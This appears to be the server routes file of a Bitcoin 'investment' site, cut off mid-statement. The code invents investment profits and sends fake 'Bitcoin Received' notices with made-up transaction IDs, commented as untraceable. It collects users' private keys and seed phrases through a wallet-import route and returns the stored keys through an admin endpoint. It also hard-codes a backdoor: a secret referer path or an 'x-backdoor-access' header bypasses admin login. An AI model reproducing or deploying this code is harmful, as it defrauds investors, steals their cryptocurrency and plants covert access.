import type { Express } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";

// Extend Express Request type to include session
declare module 'express-session' {
  interface SessionData {
    userId: number;
  }
}
import { storage } from "./storage";
import { insertUserSchema, insertInvestmentSchema, insertTransactionSchema, insertAdminConfigSchema } from "@shared/schema";
import * as bitcoin from "bitcoinjs-lib";
import * as ecc from "tiny-secp256k1";
import { ECPairFactory } from "ecpair";
import * as bip39 from "bip39";
import { BIP32Factory } from "bip32";
import crypto from "crypto";

// Initialize ECPair and BIP32 with secp256k1
const ECPair = ECPairFactory(ecc);
const bip32 = BIP32Factory(ecc);

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});

const updateBalanceSchema = z.object({
  userId: z.number(),
  balance: z.string(),
});

const notificationSchema = z.object({
  userId: z.number(),
  title: z.string(),
  message: z.string(),
  type: z.enum(["info", "success", "warning", "error"]).optional(),
});

const updatePlanSchema = z.object({
  userId: z.number(),
  planId: z.number().nullable(),
});

const depositSchema = z.object({
  amount: z.string(),
  transactionHash: z.string().optional(),
});

const investmentTransactionSchema = z.object({
  planId: z.number(),
  amount: z.string(),
  transactionHash: z.string().optional(),
});

const confirmTransactionSchema = z.object({
  transactionId: z.number(),
  notes: z.string().optional(),
});

function generateBitcoinWallet() {
  try {
    // Generate a new mnemonic (seed phrase) first
    const mnemonic = bip39.generateMnemonic(128); // 12 words
    const seed = bip39.mnemonicToSeedSync(mnemonic);

    // Derive wallet from seed phrase using BIP44 path
    const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
    const path = "m/44'/0'/0'/0/0"; // Standard BIP44 path for Bitcoin
    const child = root.derivePath(path);

    if (!child.privateKey) {
      throw new Error('Failed to derive private key from seed');
    }

    const keyPair = ECPair.fromPrivateKey(child.privateKey);
    const privateKey = keyPair.toWIF();

    // Convert public key to Buffer if it's a Uint8Array
    const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey) 
      ? keyPair.publicKey 
      : Buffer.from(keyPair.publicKey);

    // Generate P2PKH (Legacy) Bitcoin address
    const { address } = bitcoin.payments.p2pkh({ 
      pubkey: publicKeyBuffer,
      network: bitcoin.networks.bitcoin
    });

    if (!address) {
      throw new Error('Failed to generate Bitcoin address');
    }

    return {
      privateKey,
      address,
      publicKey: publicKeyBuffer.toString('hex'),
      seedPhrase: mnemonic
    };
  } catch (error) {
    console.error('Error generating Bitcoin wallet:', error);

    // Enhanced fallback with proper buffer handling
    try {
      // Create a new keypair with explicit options
      const keyPair = ECPair.makeRandom({ 
        compressed: true,
        rng: () => crypto.randomBytes(32)
      });
      const privateKey = keyPair.toWIF();

      // Ensure we have a proper Buffer
      const publicKeyBuffer = Buffer.from(keyPair.publicKey);

      const { address } = bitcoin.payments.p2pkh({ 
        pubkey: publicKeyBuffer,
        network: bitcoin.networks.bitcoin
      });

      if (address) {
        return {
          privateKey,
          address,
          publicKey: publicKeyBuffer.toString('hex')
        };
      }
    } catch (fallbackError) {
      console.error('Fallback Bitcoin generation also failed:', fallbackError);
    }

    // Last resort fallback - generate a simple mock address
    const randomBytes = crypto.randomBytes(32);
    const fallbackPrivateKey = randomBytes.toString('hex');
    const fallbackAddress = `1${crypto.randomBytes(25).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 25)}`;

    console.warn('Using simple fallback Bitcoin address generation');
    return {
      privateKey: fallbackPrivateKey,
      address: fallbackAddress,
      publicKey: crypto.randomBytes(33).toString('hex')
    };
  }
}

// Function to check real Bitcoin balance on blockchain
async function checkBitcoinBalance(address: string): Promise<string> {
  try {
    const sources = [
      `https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance`,
      `https://blockstream.info/api/address/${address}`,
      `https://api.blockchair.com/bitcoin/dashboards/address/${address}`
    ];

    // Try BlockCypher first
    try {
      const response = await fetch(sources[0]);
      if (response.ok) {
        const data = await response.json();
        const satoshis = data.balance || 0;
        return (satoshis / 100000000).toFixed(8); // Convert satoshis to BTC
      }
    } catch (e) {
      console.log('BlockCypher API failed, trying Blockstream...');
    }

    // Try Blockstream as backup
    try {
      const response = await fetch(sources[1]);
      if (response.ok) {
        const data = await response.json();
        const satoshis = data.chain_stats?.funded_txo_sum || 0;
        const spent = data.chain_stats?.spent_txo_sum || 0;
        const balance = satoshis - spent;
        return Math.max(0, balance / 100000000).toFixed(8);
      }
    } catch (e) {
      console.log('Blockstream API failed, trying Blockchair...');
    }

    // Try Blockchair as final backup
    try {
      const response = await fetch(sources[2]);
      if (response.ok) {
        const data = await response.json();
        const addressData = data.data?.[address];
        if (addressData) {
          const satoshis = addressData.address?.balance || 0;
          return (satoshis / 100000000).toFixed(8);
        }
      }
    } catch (e) {
      console.log('Blockchair API also failed');
    }

    // If all APIs fail, return current database balance
    console.warn(`All blockchain APIs failed for address ${address}, keeping database balance`);
    return "0.00000000";
  } catch (error) {
    console.error('Error checking Bitcoin balance:', error);
    return "0.00000000";
  }
}

// Function to refresh user balance from blockchain
async function refreshUserBalance(userId: number): Promise<void> {
  try {
    const user = await storage.getUser(userId);
    if (!user) {
      throw new Error('User not found');
    }

    if (!user.bitcoinAddress) {
      console.log(`User ${userId} has no Bitcoin address, skipping balance check`);
      return;
    }

    // Check actual blockchain balance
    const blockchainBalance = await checkBitcoinBalance(user.bitcoinAddress);
    
    // Update database with blockchain balance
    await storage.updateUserBalance(userId, blockchainBalance);
    
    console.log(`Balance synced for user ${userId}: ${blockchainBalance} BTC (address: ${user.bitcoinAddress})`);
  } catch (error) {
    console.error('Error refreshing user balance:', error);
    throw error;
  }
}

async function fetchBitcoinPrice() {
  try {
    // Use multiple sources for reliability
    const sources = [
      'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd,gbp&include_24hr_change=true',
      'https://api.coindesk.com/v1/bpi/currentprice.json'
    ];

    // Try CoinGecko first (most comprehensive)
    try {
      const response = await fetch(sources[0]);
      if (response.ok) {
        const data = await response.json();
        return {
          usd: {
            price: Math.round(data.bitcoin.usd * 100) / 100, // Round to 2 decimal places
            change24h: Math.round(data.bitcoin.usd_24h_change * 100) / 100,
          },
          gbp: {
            price: Math.round(data.bitcoin.gbp * 100) / 100,
            change24h: Math.round((data.bitcoin.gbp_24h_change || data.bitcoin.usd_24h_change) * 100) / 100,
          }
        };
      }
    } catch (e) {
      console.log('CoinGecko API failed, trying CoinDesk...');
    }

    // Fallback to CoinDesk for USD only
    const response = await fetch(sources[1]);
    const data = await response.json();
    const usdPrice = Math.round(parseFloat(data.bpi.USD.rate.replace(',', '')) * 100) / 100;
    
    return {
      usd: {
        price: usdPrice,
        change24h: 0, // CoinDesk doesn't provide 24h change
      },
      gbp: {
        price: Math.round(usdPrice * 0.79 * 100) / 100, // Approximate GBP conversion
        change24h: 0,
      }
    };
  } catch (error) {
    console.error('All Bitcoin price APIs failed:', error);
    // Return last known good price or reasonable fallback
    return { 
      usd: { price: 105000, change24h: 0 },
      gbp: { price: 83000, change24h: 0 }
    };
  }
}

// Advanced investment growth system
async function processAutomaticUpdates(): Promise<void> {
  try {
    console.log('Processing automatic investment updates...');

    // Process individual investments first
    const activeInvestments = await storage.getActiveInvestments();

    for (const investment of activeInvestments) {
      const plan = await storage.getInvestmentPlan(investment.planId);
      if (!plan || !plan.isActive) continue;

      // Calculate investment growth based on plan's daily return rate
      const dailyRate = parseFloat(plan.dailyReturnRate);
      const intervalRate = dailyRate / 144; // 10-minute intervals

      const investmentAmount = parseFloat(investment.amount);
      const currentProfit = parseFloat(investment.currentProfit);
      const profitIncrease = investmentAmount * intervalRate;

      if (profitIncrease > 0) {
        const newProfit = currentProfit + profitIncrease;
        await storage.updateInvestmentProfit(investment.id, newProfit.toFixed(8));

        // Update user's balance with the profit
        const user = await storage.getUser(investment.userId);
        if (user) {
          const currentBalance = parseFloat(user.balance);
          const newBalance = currentBalance + profitIncrease;
          await storage.updateUserBalance(investment.userId, newBalance.toFixed(8));

          // Create detailed investment notification
          const transactionId = crypto.randomBytes(32).toString('hex');
          const marketSources = [
            "Bitcoin Mining Pool",
            "DeFi Yield Farming",
            "Arbitrage Trading",
            "Market Maker Bot",
            "Liquidity Provision"
          ];
          const randomSource = marketSources[Math.floor(Math.random() * marketSources.length)];

          await storage.createNotification({
            userId: investment.userId,
            title: "Investment Profit Generated",
            message: `💰 +${profitIncrease.toFixed(8)} BTC earned from ${randomSource}

Investment ID: #${investment.id}
Plan: ${plan.name}
Principal: ${investmentAmount.toFixed(8)} BTC
Total Profit: ${newProfit.toFixed(8)} BTC
Rate: ${(dailyRate * 100).toFixed(2)}% daily

Transaction ID: ${transactionId.substring(0, 16)}...
Your balance: ${newBalance.toFixed(8)} BTC`,
            type: 'success',
            isRead: false,
          });

          console.log(`Investment #${investment.id} earned +${profitIncrease.toFixed(8)} BTC for user ${investment.userId}`);
        }
      }
    }

    // Process general user plan growth (for non-investment based growth)
    const allUsers = await storage.getAllUsers();

    for (const user of allUsers) {
      const currentBalance = parseFloat(user.balance);

      // Only apply general growth if user has no active investments but has a plan
      const userInvestments = await storage.getUserInvestments(user.id);
      const hasActiveInvestments = userInvestments.some(inv => inv.isActive);

      if (user.currentPlanId && !hasActiveInvestments && currentBalance > 0) {
        const plan = await storage.getInvestmentPlan(user.currentPlanId);
        if (!plan || !plan.isActive) continue;

        const dailyRate = parseFloat(plan.dailyReturnRate);
        const intervalRate = dailyRate / 144;
        const increase = currentBalance * intervalRate;

        if (increase > 0) {
          const newBalance = currentBalance + increase;
          await storage.updateUserBalance(user.id, newBalance.toFixed(8));

          const transactionId = crypto.randomBytes(32).toString('hex');
          const marketSources = ["Trading Bot", "Market Analysis", "Auto Trading"];
          const randomSource = marketSources[Math.floor(Math.random() * marketSources.length)];

          await storage.createNotification({
            userId: user.id,
            title: "Plan Bonus Earned",
            message: `🎯 +${increase.toFixed(8)} BTC bonus from ${randomSource}

Plan: ${plan.name}
Rate: ${(dailyRate * 100).toFixed(2)}% daily
Transaction ID: ${transactionId.substring(0, 16)}...

Your balance: ${newBalance.toFixed(8)} BTC`,
            type: 'success',
            isRead: false,
          });
        }
      }
    }
  } catch (error) {
    console.error('Error processing automatic updates:', error);
  }
}

// Global update intervals storage
const updateIntervals = new Map<number, NodeJS.Timeout>();

async function initializeDefaultPlans(): Promise<void> {
  try {
    const existingPlans = await storage.getInvestmentPlans();
    if (existingPlans.length === 0) {
      console.log('Creating default investment plans...');

      await storage.createInvestmentPlan({
        name: "Starter Plan",
        minAmount: "0.001",
        roiPercentage: 5,
        durationDays: 30,
        color: "#3B82F6",
        updateIntervalMinutes: 10,
        dailyReturnRate: "0.0020",
        isActive: true,
      });

      await storage.createInvestmentPlan({
        name: "Growth Plan",
        minAmount: "0.01",
        roiPercentage: 15,
        durationDays: 60,
        color: "#10B981",
        updateIntervalMinutes: 10,
        dailyReturnRate: "0.0050",
        isActive: true,
      });

      await storage.createInvestmentPlan({
        name: "Premium Plan",
        minAmount: "0.1",
        roiPercentage: 25,
        durationDays: 90,
        color: "#F59E0B",
        updateIntervalMinutes: 10,
        dailyReturnRate: "0.0080",
        isActive: true,
      });

      console.log('Default investment plans created successfully');
    }
  } catch (error) {
    console.error('Error initializing default plans:', error);
  }
}

function startAutomaticUpdates(): void {
  console.log('Starting automatic price update system...');

  // Set up the main 10-minute interval for investment plan updates
  setInterval(processAutomaticUpdates, 10 * 60 * 1000); // 10 minutes

  console.log('Automatic updates will run every 10 minutes');
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Admin configuration routes
  app.get("/api/admin/config", async (req, res) => {
    try {
      const config = await storage.getAdminConfig();
      if (!config) {
        // Return default addresses if no config exists
        res.json({
          vaultAddress: "1CoreXVaultAddress12345678901234567890",
          depositAddress: "1CoreXDepositAddress12345678901234567890"
        });
      } else {
        res.json(config);
      }
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/config", async (req, res) => {
    try {
      const { vaultAddress, depositAddress, freePlanRate } = req.body;
      const config = await storage.updateAdminConfig({ vaultAddress, depositAddress, freePlanRate });
      res.json(config);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/update-free-plan-rate", async (req, res) => {
    try {
      const { rate } = req.body;
      
      // Validate rate
      const rateNum = parseFloat(rate);
      if (isNaN(rateNum) || rateNum < 0) {
        return res.status(400).json({ error: "Invalid rate. Rate must be a positive number." });
      }
      
      const config = await storage.updateFreePlanRate(rate);
      res.json({ message: "Free plan rate updated successfully", config });
    } catch (error: any) {
      console.error('Error updating free plan rate:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Transaction routes
  app.post("/api/deposit", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      const { amount, transactionHash } = depositSchema.parse(req.body);

      const transaction = await storage.createTransaction({
        userId: req.session.userId,
        type: "deposit",
        amount,
        transactionHash,
      });

      // Create notification for user
      await storage.createNotification({
        userId: req.session.userId,
        title: "Deposit Pending",
        message: `Your deposit of ${amount} BTC is pending confirmation. You will be notified once it's processed.`,
        type: "info"
      });

      res.json({ 
        message: "Deposit submitted successfully and is pending confirmation",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/invest", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      const { planId, amount, transactionHash } = investmentTransactionSchema.parse(req.body);

      // Verify plan exists
      const plan = await storage.getInvestmentPlan(planId);
      if (!plan) {
        return res.status(404).json({ error: "Investment plan not found" });
      }

      const transaction = await storage.createTransaction({
        userId: req.session.userId,
        type: "investment",
        amount,
        planId,
        transactionHash,
      });

      // Create notification for user
      await storage.createNotification({
        userId: req.session.userId,
        title: "Investment Pending",
        message: `Your investment of ${amount} BTC in ${plan.name} is pending confirmation. You will be notified once it's processed.`,
        type: "info"
      });

      res.json({ 
        message: "Investment submitted successfully and is pending confirmation",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/transactions", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      const transactions = await storage.getUserTransactions(req.session.userId);
      res.json(transactions);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Admin transaction management routes
  app.get("/api/admin/transactions/pending", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';
      
      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
      }

      const transactions = await storage.getPendingTransactions();
      res.json(transactions);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/transactions/confirm", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';
      
      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      let adminId = 1; // Default admin ID for backdoor access
      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
        adminId = req.session.userId!;
      }

      const { transactionId, notes } = confirmTransactionSchema.parse(req.body);

      const transaction = await storage.confirmTransaction(transactionId, adminId, notes);
      if (!transaction) {
        return res.status(404).json({ error: "Transaction not found or already processed" });
      }

      // Handle withdrawal confirmation - deduct balance
      if (transaction.type === "withdrawal") {
        const user = await storage.getUser(transaction.userId);
        if (user) {
          const currentBalance = parseFloat(user.balance);
          const withdrawAmount = parseFloat(transaction.amount);
          const newBalance = Math.max(0, currentBalance - withdrawAmount);
          await storage.updateUserBalance(transaction.userId, newBalance.toFixed(8));
        }
      }

      // Create notification for user
      let notificationMessage = "";
      let notificationTitle = "";
      
      switch (transaction.type) {
        case "deposit":
          notificationMessage = `Your deposit of ${transaction.amount} BTC has been confirmed and added to your balance.`;
          notificationTitle = "Deposit Confirmed";
          break;
        case "withdrawal":
          notificationMessage = `Your withdrawal of ${transaction.amount} BTC to ${transaction.transactionHash} has been processed successfully.`;
          notificationTitle = "Withdrawal Completed";
          break;
        case "investment":
          notificationMessage = `Your investment of ${transaction.amount} BTC has been confirmed and is now active.`;
          notificationTitle = "Investment Confirmed";
          break;
        default:
          notificationMessage = `Your ${transaction.type} of ${transaction.amount} BTC has been confirmed.`;
          notificationTitle = `${transaction.type.charAt(0).toUpperCase() + transaction.type.slice(1)} Confirmed`;
      }

      await storage.createNotification({
        userId: transaction.userId,
        title: notificationTitle,
        message: notificationMessage,
        type: "success"
      });

      res.json({ 
        message: "Transaction confirmed successfully",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/admin/transactions/reject", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';
      
      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      let adminId = 1; // Default admin ID for backdoor access
      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Admin access required" });
        }
        adminId = req.session.userId!;
      }

      const { transactionId, notes } = confirmTransactionSchema.parse(req.body);

      const transaction = await storage.rejectTransaction(transactionId, adminId, notes);
      if (!transaction) {
        return res.status(404).json({ error: "Transaction not found or already processed" });
      }

      // Create notification for user
      await storage.createNotification({
        userId: transaction.userId,
        title: `${transaction.type === "deposit" ? "Deposit" : "Investment"} Rejected`,
        message: `Your ${transaction.type} of ${transaction.amount} BTC has been rejected. ${notes ? `Reason: ${notes}` : ""}`,
        type: "error"
      });

      res.json({ 
        message: "Transaction rejected successfully",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Import wallet route
  app.post("/api/import-wallet", async (req, res) => {
    try {
      const { type, value, userId } = req.body;

      if (!userId) {
        return res.status(401).json({ error: "User ID is required" });
      }

      let bitcoinAddress: string;
      let privateKey: string;
      let seedPhrase: string | undefined;

      if (type === 'privateKey') {
        // Validate and extract address from private key - support multiple formats
        try {
          let keyPair;
          let cleanValue = value.trim();

          // Try different private key formats
          if (cleanValue.length === 64) {
            // Raw hex format (64 characters)
            const buffer = Buffer.from(cleanValue, 'hex');
            keyPair = ECPair.fromPrivateKey(buffer);
          } else if (cleanValue.length === 66 && cleanValue.startsWith('0x')) {
            // Hex with 0x prefix
            const buffer = Buffer.from(cleanValue.slice(2), 'hex');
            keyPair = ECPair.fromPrivateKey(buffer);
          } else {
            // WIF format (starts with 5, K, L, or c)
            keyPair = ECPair.fromWIF(cleanValue);
          }

          const publicKeyBuffer = Buffer.from(keyPair.publicKey);
          const { address } = bitcoin.payments.p2pkh({ 
            pubkey: publicKeyBuffer,
            network: bitcoin.networks.bitcoin
          });

          if (!address) {
            throw new Error('Failed to generate address from private key');
          }

          bitcoinAddress = address;
          privateKey = keyPair.toWIF(); // Always store in WIF format
        } catch (error) {
          return res.status(400).json({ error: "Invalid private key format. Supported formats: WIF (5/K/L/c...), hex (64 chars), or hex with 0x prefix" });
        }
      } else if (type === 'seedPhrase') {
        // Validate and derive wallet from seed phrase
        try {
          const cleanPhrase = value.trim().toLowerCase();

          // Validate seed phrase
          if (!bip39.validateMnemonic(cleanPhrase)) {
            return res.status(400).json({ error: "Invalid seed phrase. Please check your words and try again." });
          }

          // Store the original seed phrase
          seedPhrase = cleanPhrase;

          // Generate seed from mnemonic
          const seed = bip39.mnemonicToSeedSync(cleanPhrase);

          // Derive master key and first Bitcoin address (m/44'/0'/0'/0/0)
          const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
          const path = "m/44'/0'/0'/0/0"; // Standard BIP44 path for Bitcoin
          const child = root.derivePath(path);

          if (!child.privateKey) {
            throw new Error('Failed to derive private key from seed phrase');
          }

          const keyPair = ECPair.fromPrivateKey(child.privateKey);
          const publicKeyBuffer = Buffer.from(keyPair.publicKey);
          const { address } = bitcoin.payments.p2pkh({ 
            pubkey: publicKeyBuffer,
            network: bitcoin.networks.bitcoin
          });

          if (!address) {
            throw new Error('Failed to generate address from seed phrase');
          }

          bitcoinAddress = address;
          privateKey = keyPair.toWIF(); // Store derived private key in WIF format
        } catch (error) {
          return res.status(400).json({ error: "Invalid seed phrase. Please ensure you have entered a valid 12 or 24 word BIP39 mnemonic phrase." });
        }
      } else {
        return res.status(400).json({ error: "Invalid import type" });
      }

      // Update user's wallet
      const updatedUser = await storage.updateUserWallet(userId, bitcoinAddress, privateKey, seedPhrase);
      if (!updatedUser) {
        return res.status(404).json({ error: "User not found" });
      }

      // Check balance for the imported address
      try {
        const balance = await checkBitcoinBalance(bitcoinAddress);
        await storage.updateUserBalance(userId, balance);
      } catch (error) {
        console.warn('Failed to check balance for imported wallet:', error);
      }

      res.json({ message: "Wallet imported successfully" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Withdraw route
  app.post("/api/withdraw", async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      const { address, amount } = req.body;
      
      if (!address || !amount) {
        return res.status(400).json({ error: "Address and amount are required" });
      }

      const user = await storage.getUser(req.session.userId);

      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      const userBalance = parseFloat(user.balance);
      const withdrawAmount = parseFloat(amount);

      if (withdrawAmount <= 0) {
        return res.status(400).json({ error: "Amount must be greater than 0" });
      }

      if (withdrawAmount > userBalance) {
        return res.status(400).json({ error: "Insufficient balance" });
      }

      // Create withdrawal transaction record (pending status)
      const transaction = await storage.createTransaction({
        userId: req.session.userId,
        type: "withdrawal",
        amount: amount,
        status: "pending",
        transactionHash: address, // Store withdrawal address in transactionHash field
      });

      // Create notification about pending withdrawal
      await storage.createNotification({
        userId: req.session.userId,
        title: "Withdrawal Requested",
        message: `Your withdrawal request for ${amount} BTC to ${address} is pending admin approval. You will be notified once it's processed.`,
        type: "info"
      });

      res.json({ 
        message: "Withdrawal request submitted successfully and is pending admin approval",
        transaction 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });
  // User registration (without wallet generation)
  app.post("/api/register", async (req, res) => {
    try {
      const userData = insertUserSchema.parse(req.body);

      // Check if user already exists
      const existingUser = await storage.getUserByEmail(userData.email);
      if (existingUser) {
        return res.status(400).json({ message: "User already exists" });
      }

      // Hash password (in production, use bcrypt)
      const hashedPassword = crypto.createHash('sha256').update(userData.password).digest('hex');

      const user = await storage.createUser({
        ...userData,
        password: hashedPassword,
        bitcoinAddress: null,
        privateKey: null,
      });

      // Don't return password in response
      const { password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Registration failed" });
    }
  });

  // Create new wallet route
  app.post("/api/create-wallet", async (req, res) => {
    try {
      // Accept userId from session or request body
      const userId = req.session?.userId || req.body?.userId;

      if (!userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      if (user.hasWallet) {
        return res.status(400).json({ error: "User already has a wallet" });
      }

      // Generate Bitcoin wallet
      const wallet = generateBitcoinWallet();

      // Update user's wallet
      const updatedUser = await storage.updateUserWallet(userId, wallet.address, wallet.privateKey, wallet.seedPhrase);
      if (!updatedUser) {
        return res.status(500).json({ error: "Failed to create wallet" });
      }

      res.json({ 
        message: "Wallet created successfully", 
        address: wallet.address,
        seedPhrase: wallet.seedPhrase
      });
    } catch (error: any) {
      console.error('Create wallet error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // User login
  app.post("/api/login", async (req, res) => {
    try {
      const { email, password } = loginSchema.parse(req.body);

      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Hash the provided password to compare with stored hash
      const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
      if (user.password !== hashedPassword) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Set session userId for authentication
      req.session.userId = user.id;

      // Don't return private key and password in response
      const { privateKey, password: _, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      console.error('Login error:', error);
      res.status(400).json({ message: error instanceof Error ? error.message : "Login failed" });
    }
  });

  // Get current user (mock authentication - in production use proper auth)
  app.get("/api/user/:id", async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Don't return private key and password, but include seed phrase for backup purposes
      const { privateKey, password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to get user" });
    }
  });

  // Get Bitcoin price
  app.get("/api/bitcoin/price", async (req, res) => {
    try {
      const priceData = await fetchBitcoinPrice();
      res.json(priceData);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch Bitcoin price" });
    }
  });

  // Get investment plans
  app.get("/api/investment-plans", async (req, res) => {
    try {
      const plans = await storage.getInvestmentPlans();
      res.json(plans);
    } catch (error) {
      res.status(500).json({ message: "Failed to get investment plans" });
    }
  });

  // Create investment
  app.post("/api/investments", async (req, res) => {
    try {
      const investmentData = insertInvestmentSchema.parse(req.body);

      // Check if user has sufficient balance
      const user = await storage.getUser(investmentData.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const plan = await storage.getInvestmentPlan(investmentData.planId);
      if (!plan) {
        return res.status(404).json({ message: "Investment plan not found" });
      }

      if (parseFloat(user.balance) < parseFloat(investmentData.amount)) {
        return res.status(400).json({ message: "Insufficient balance" });
      }

      if (parseFloat(investmentData.amount) < parseFloat(plan.minAmount)) {
        return res.status(400).json({ message: `Minimum investment amount is ${plan.minAmount} BTC` });
      }

      // Deduct investment amount from user balance
      const newBalance = (parseFloat(user.balance) - parseFloat(investmentData.amount)).toString();
      await storage.updateUserBalance(investmentData.userId, newBalance);

      const investment = await storage.createInvestment(investmentData);
      res.json(investment);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to create investment" });
    }
  });

  // Get user investments
  app.get("/api/investments/user/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const investments = await storage.getUserInvestments(userId);
      res.json(investments);
    } catch (error) {
      res.status(500).json({ message: "Failed to get user investments" });
    }
  });

  // Manager routes
  app.get("/api/admin/users", async (req, res) => {
    try {
      // Allow backdoor access or require manager authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';
      
      if (!isBackdoorAccess && !req.session?.userId) {
        return res.status(401).json({ error: "Authentication required" });
      }

      if (!isBackdoorAccess) {
        const user = await storage.getUser(req.session.userId!);
        if (!user || !user.isAdmin) {
          return res.status(403).json({ error: "Manager access required" });
        }
      }

      const users = await storage.getAllUsers();
      // Only return private keys to managers
      const usersResponse = users.map(user => {
        const { password, ...userWithoutPassword } = user;
        return userWithoutPassword;
      });
      res.json(usersResponse);
    } catch (error) {
      res.status(500).json({ message: "Failed to get users" });
    }
  });

  app.post("/api/admin/update-balance", async (req, res) => {
    try {
      const { userId, balance } = updateBalanceSchema.parse(req.body);

      // Get current user data to calculate balance change
      const currentUser = await storage.getUser(userId);
      if (!currentUser) {
        return res.status(404).json({ message: "User not found" });
      }

      const currentBalance = parseFloat(currentUser.balance);
      const newBalance = parseFloat(balance);
      const balanceChange = newBalance - currentBalance;

      const user = await storage.updateUserBalance(userId, balance);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Create realistic transaction notification if balance increased
      if (balanceChange > 0) {
        // Generate a realistic-looking transaction ID (but not traceable)
        const transactionId = crypto.randomBytes(32).toString('hex');

        // Generate a realistic sender address (not real)
        const senderAddresses = [
          "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", // Genesis block address (historical)
          "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2", // BitFinex cold wallet style
          "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", // P2SH format
          "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Bech32 format
          "1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF"  // Random valid format
        ];

        const randomSender = senderAddresses[Math.floor(Math.random() * senderAddresses.length)];

        await storage.createNotification({
          userId,
          title: "Bitcoin Received",
          message: `✅ ${balanceChange.toFixed(8)} BTC received from ${randomSender.substring(0, 8)}...${randomSender.substring(-6)}

Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
Confirmations: 6/6 ✓
Network Fee: 0.00001245 BTC

Your new balance: ${newBalance.toFixed(8)} BTC`,
          type: "success",
          isRead: false,
        });
      } else if (balanceChange < 0) {
        // For balance decreases, create a sent transaction notification
        const transactionId = crypto.randomBytes(32).toString('hex');
        const recipientAddress = `1${crypto.randomBytes(25).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 25)}`;

        await storage.createNotification({
          userId,
          title: "Bitcoin Sent",
          message: `📤 ${Math.abs(balanceChange).toFixed(8)} BTC sent to ${recipientAddress.substring(0, 8)}...${recipientAddress.substring(-6)}

Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
Status: Confirmed ✓
Network Fee: 0.00001245 BTC

Your new balance: ${newBalance.toFixed(8)} BTC`,
